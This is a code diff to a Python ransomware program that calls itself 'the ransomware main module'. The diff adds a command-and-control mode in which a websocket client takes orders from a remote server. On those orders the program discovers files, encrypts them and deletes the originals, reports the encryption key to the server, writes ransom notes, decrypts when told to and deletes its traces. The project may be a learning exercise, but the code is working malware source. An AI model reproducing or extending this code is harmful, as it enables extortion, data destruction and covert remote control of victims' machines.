@@ -1,5 +1,8 @@
 import os
 from crypto import CryptoGraphy
+from websocket_client import WebsocketClient
+import asyncio
+import json
 
 class Program():
     def __init__(self, data = None, mode = "manual", system = "Darwin"):
@@ -9,20 +12,35 @@ class Program():
         self.__directories_with_files = []
         self.__found_files = []
         self.__should_cli_run = True
+        self.__id = ""
+        self.connected = asyncio.Event()
+        self.decrypted = asyncio.Event()
+        self.__client: WebsocketClient = None
         if data is not None:
             self.__found_files = data.get("found_files", [])
             self.__directories_with_files = data.get("directories_with_files", [])
         
-    def start(self):
+    async def start(self):
         print("This is the ransomware main module.")
-        print("What would you like to do?")
         match self.__mode__:
             case "auto":
                 self.__auto_mode()
             case "manual":
-                self.__cli()
+                print("What would you like to do?")
+                await self.__cli()
             case "c2":
-                print("C2 mode is not yet implemented.")
+                await self.__c2_mode()
+
+    async def stop(self):
+        match self.__mode__:
+            case "c2":
+                print("Stopping C2 connection...")
+                if self.__client is not None:
+                    await self.__client.stop()
+            case "auto":
+                pass
+            case "manual":
+                self.__should_cli_run = False
 
     def __help(self):
         print("Available commands:")
@@ -61,7 +79,7 @@ class Program():
         print("\n")
         print("USE AT YOUR OWN RISK!\n")
 
-    def __change_mode(self, new_mode = "manual"):
+    async def __change_mode(self, new_mode = "manual"):
         print(f"Mode changed to {new_mode}")
         match new_mode:
             case "auto":
@@ -70,12 +88,17 @@ class Program():
                 self.__auto_mode()
             case "c2":
                 print("C2 mode selected. The program will attempt to connect to a command and control server.")
+                self.__should_cli_run = False
+                await self.__c2_mode()
             case "manual":
                 print("Manual mode selected. The program will wait for user input.")
                 if self.__mode__ != new_mode:
-                    self.__cli()
+                    await self.__cli()
 
         self.__mode__ = new_mode
+
+    def set_id(self, id: str):
+        self.__id = id
     
     def __envcheck(self):
         import platform
@@ -123,26 +146,33 @@ class Program():
         with open("discovered_info.json", "w") as output_file:
             json.dump({
                 "found_files": self.__found_files,
-                "directories_with_files": self.__directories_with_files
+                "directories_with_files": self.__directories_with_files,
+                "mode": self.__mode__,
+                "id": self.__id
             }, output_file, indent=4)
 
         print(self.__directories_with_files)
         print(f"Total files found: {len(self.__found_files)}")
         print(f"Total directories with targeted files: {len(self.__directories_with_files)}")
 
-    def __setup(self, should_encrypt=False, should_delete_original=False):
-        self.__criptography = CryptoGraphy(should_encrypt=should_encrypt, should_delete_original=should_delete_original)
+    def __setup(self, should_encrypt=False, should_delete_original=False, c2_mode=False):
+        self.__criptography = CryptoGraphy(
+            should_encrypt=should_encrypt, 
+            should_delete_original=should_delete_original,
+            c2_mode=c2_mode
+            )
         self.__criptography.setup()
         print(f"Encryption: {should_encrypt}, Delete original files: {should_delete_original}")
 
     def __encrypt(self):
         if self.__criptography is None:
             print("Cryptography not set up. Please run 'setup' first.")
-            return
+            return False
 
         print("Encrypting files...")
         for file in self.__found_files:
             self.__criptography.encrypt(file)
+        return True
 
     def __ransomnote(self):
         print("Creating ransom notes and decryptor scripts...")
@@ -187,10 +217,11 @@ class Program():
     def decrypt(self):
         if self.__criptography is None:
             print("Cryptography not set up. Please run 'setup' first.")
-            return
+            return False
 
         for file in self.__found_files:
             self.__criptography.decrypt(file + ".ENCRYPTED")
+        return True
 
     def delete_traces(self):
         print("Deleting traces...")
@@ -219,7 +250,7 @@ class Program():
         import sys
         print(sys.path)
 
-    def __cli(self):
+    async def __cli(self):
         while self.__should_cli_run:
             inp = input("MyCLI> ").strip()
             command = inp.split()[0]
@@ -237,7 +268,7 @@ class Program():
                 case "changeMode":
                     print(inp.split()[1])
                     if len(inp.split()) > 1 and inp.split()[1] in ["auto", "c2", "manual"]:
-                        self.__change_mode(inp.split()[1])
+                        await self.__change_mode(inp.split()[1])
                     else:
                         print("Mode not available. Available modes: auto, c2, manual")
 
@@ -288,7 +319,90 @@ class Program():
         self.__setup(should_encrypt=True, should_delete_original=True)
         self.__encrypt()
         self.__ransomnote()
+
+    async def __c2_mode(self):
+        self.__envcheck()
+        self.__client = WebsocketClient(username=self.__system__, 
+                        system=self.__system__, 
+                        handler=self.__message_handler,
+                        id=self.__id)
+        await self.__client.connect()
+
+    def __message_handler(self, message: dict):
+        message_data = message.get("data", {})
+        message_reply = {}
+        match message.get("type"):
+            case "set_id":
+                self.set_id(message.get("data", {}).get("id", ""))
+                print("ID SET", self.__id)
+                self.connected.set()
+                return None
+            
+            case "discovery_req":
+                self.__directory(start_path=message_data.get("initial_directory", "/"))
+                message_reply["type"] = "discovery_rep"
+                message_reply["data"] = {
+                    "files_found": len(self.__found_files),
+                    "directories": len(self.__directories_with_files)
+                }
+            case "crypto_req":
+                self.__setup(
+                    should_encrypt=message_data.get("encrypt", False),
+                    should_delete_original=message_data.get("delete", False),
+                    c2_mode=True
+                )
+
+                message_reply["type"] = "crypto_rep"
+                message_reply["data"] = {
+                    "key": self.__criptography.key.decode()
+                }
+
+            case "encryption_req":
+                result = self.__encrypt()
+                message_reply["type"] = "encryption_rep"
+                message_reply["data"] = {"total_time": 1 if result else -1}
+                return message_reply
+            
+            case "ransomnote_req":
+                self.__ransomnote()
+                message_reply["type"] = "ransomnote_rep"
+                message_reply["data"] = {}
+                
+            case "decryption_rep":
+                should_decrypt = message_data.get("status", False)
+                result = False
+                key = message_data.get("key", None)
+
+                if should_decrypt and key is not None:
+                    if self.__criptography is None:
+                        self.__setup(
+                            should_encrypt=True,
+                            should_delete_original=True,
+                            c2_mode=True
+                        )
+                    self.__criptography.set_key(key)
+                    result = self.decrypt()
+                    if result:
+                        self.delete_traces()
+
+                message_reply["type"] = "decryption_res"
+                message_reply["data"] = {"result": result}
+                self.decrypted.set()
+                
+            case "cleaning_req":
+                self.delete_traces()
+                message_reply["type"] = "cleaning_rep"
+                message_reply["data"] = {}
+
+            case _:
+                print(f"Unknown message type from C2 server: {message.get('type')}")
+                return None
+        return message_reply
         
+
+    async def send_decryption_request(self):
+        if self.__client is not None:
+            await self.__client.send_decryption_req()
 
     def load_key(self, key_filename: str = "secret.key"):
         if self.__criptography is None:
@@ -296,10 +410,10 @@ class Program():
         return self.__criptography.load_key(key_filename)
 
 if __name__ == "__main__":
-    #TODO: mode 1st parameter of execution
-    import sys
-    mode = "manual"
-    if len(sys.argv) > 1:
-        mode = sys.argv[1]
+    from dotenv import load_dotenv
+    
+    load_dotenv()
+    mode = os.getenv("MODE", "manual")
+
     program = Program(mode=mode)
-    program.start()
+    asyncio.run(program.start()) 
